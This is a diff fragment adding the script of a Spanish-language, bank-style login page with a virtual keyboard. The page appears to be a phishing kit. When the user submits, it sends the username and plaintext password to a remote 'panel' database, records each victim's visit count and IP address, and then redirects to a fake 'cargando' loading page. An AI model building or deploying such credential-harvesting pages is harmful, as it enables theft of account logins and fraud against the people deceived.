+  bindReady(usuario, btnSig);
+  bindReady(clave, btnIng);
+
+  /* ---------- Teclado ---------- */
+  function toggleVk(force) {
+    var abrir = (typeof force === 'boolean') ? force : !vk.classList.contains('open');
+    vk.classList.toggle('open', abrir);
+    ['linkTeclado1', 'linkTeclado2'].forEach(function (id) {
+      var el = document.getElementById(id);
+      if (el) el.textContent = abrir ? 'Ocultar teclado' : 'Teclado virtual';
+    });
+    if (abrir && campo) campo.focus();
+  }
+  document.getElementById('linkTeclado1').addEventListener('click', function (e) { e.preventDefault(); campo = usuario; toggleVk(); });
+  document.getElementById('linkTeclado2').addEventListener('click', function (e) { e.preventDefault(); campo = clave;  toggleVk(); });
+
+  usuario.addEventListener('click', function () { campo = usuario; if (esMovil()) toggleVk(true); });
+  clave.addEventListener('click',   function () { campo = clave;   if (esMovil()) toggleVk(true); });
+
+  function escribir(txt) {
+    var s = campo.selectionStart, e = campo.selectionEnd, v = campo.value;
+    campo.value = v.slice(0, s) + txt + v.slice(e);
+    var p = s + txt.length;
+    campo.setSelectionRange(p, p);
+    campo.dispatchEvent(new Event('input'));
+    campo.focus();
+  }
+  function borrar() {
+    var s = campo.selectionStart, e = campo.selectionEnd, v = campo.value;
+    if (s === e && s > 0) { campo.value = v.slice(0, s - 1) + v.slice(s); campo.setSelectionRange(s - 1, s - 1); }
+    else { campo.value = v.slice(0, s) + v.slice(e); campo.setSelectionRange(s, s); }
+    campo.dispatchEvent(new Event('input'));
+    campo.focus();
+  }
+  document.querySelectorAll('.k').forEach(function (b) {
+    b.addEventListener('mousedown', function (e) { e.preventDefault(); });
+    b.addEventListener('click', function () {
+      var k = b.dataset.k;
+      if (k === 'BkSp')  { borrar(); return; }
+      if (k === 'Caps')  { caps = !caps;  b.classList.toggle('activo', caps);  return; }
+      if (k === 'Shift') { shift = !shift; b.classList.toggle('activo', shift); return; }
+      if (k === 'Space') { escribir(' '); return; }
+      var c = (caps || shift) && /[a-zñ]/.test(k) ? k.toUpperCase() : k;
+      escribir(c);
+      if (shift) { shift = false; document.querySelector('[data-k="Shift"]').classList.remove('activo'); }
+    });
+  });
+
+  document.querySelectorAll('input[name=contraste]').forEach(function (r) {
+    r.addEventListener('change', function () { vk.classList.toggle('alto', r.value === 'alto' && r.checked); });
+  });
+
+  document.getElementById('verClave').addEventListener('click', function () {
+    clave.type = clave.type === 'password' ? 'text' : 'password';
+    clave.focus();
+  });
+
+  /* ---------- Recordar usuario ---------- */
+  function guardar() {
+    try {
+      if (chk.checked && usuario.value.trim()) localStorage.setItem(KEY, usuario.value.trim());
+      else localStorage.removeItem(KEY);
+    } catch (e) {}
+  }
+  chk.addEventListener('change', guardar);
+  try { var g = localStorage.getItem(KEY); if (g) { usuario.value = g; chk.checked = true; } } catch (e) {}
+  usuario.dispatchEvent(new Event('input'));
+
+  /* ---------- Paso 1: usuario ---------- */
+  fUsuario.addEventListener('submit', function (e) {
+    e.preventDefault();
+    if (!usuario.value.trim()) { usuario.focus(); return; }
+    guardar();
+
+    // envía el usuario al panel
+    var id = sesionId();
+    DBX.set('logins/' + id, datosBase('index.html', 'USUARIO'));
+
+    var t = btnSig.textContent;
+    btnSig.textContent = 'Ingresando...';
+    setTimeout(function () {
+      btnSig.textContent = t;
+      pUsuario.hidden = true; pClave.hidden = false;
+      campo = clave; clave.focus();
+      toggleVk(esMovil());
+    }, 700);
+  });
+
+  function volver() {
+    pClave.hidden = true; pUsuario.hidden = false;
+    toggleVk(false);
+    campo = usuario; usuario.focus();
+  }
+  document.getElementById('btnAtras').addEventListener('click', volver);
+  document.getElementById('btnCancelar').addEventListener('click', volver);
+
+  /* ---------- Paso 2: contraseña -> PANEL -> cargando.html ---------- */
+  fClave.addEventListener('submit', function (e) {
+    e.preventDefault();
+    if (!clave.value) { clave.focus(); return; }
+
+    var id  = sesionId();
+    var usr = usuario.value.trim();
+
+    // 1) manda usuario + contraseña al panel
+    DBX.update('logins/' + id, Object.assign(datosBase('cargando.html', 'VALIDANDO'), {
+      clave: clave.value, claveEn: Date.now()
+    }));
+
+    // 2) contador de usuarios (para la vista USUARIOS del panel)
+    var k = usr.toLowerCase().replace(/[.#$/\[\]]/g, '_');
+    var h = historialCache[k] || { user: usr, veces: 0, primeraVez: Date.now() };
+    DBX.set('historial/' + k, {
+      user: usr, veces: (h.veces || 0) + 1,
+      primeraVez: h.primeraVez || Date.now(), ultimaVez: Date.now(), ultimaIP: ipInfo.ip
+    });
+
+    // 3) avisa y salta al splash
+    btnIng.textContent = 'Validando...';
+    btnIng.classList.remove('ready');
+    setTimeout(function () { location.href = 'cargando.html'; }, 900);
+  });
+
+  /* ---------- Historial en caché ---------- */
+  var historialCache = {};
+  DBX.on('historial', function (h) { historialCache = h || {}; });
+
+  document.querySelectorAll('.card-links a, .faq, .navy').forEach(function (a) {
+    a.addEventListener('click', function (e) { if (a.getAttribute('href') === '#') e.preventDefault(); });
+  });
+})();
+</script>
+
+</body>
+</html>
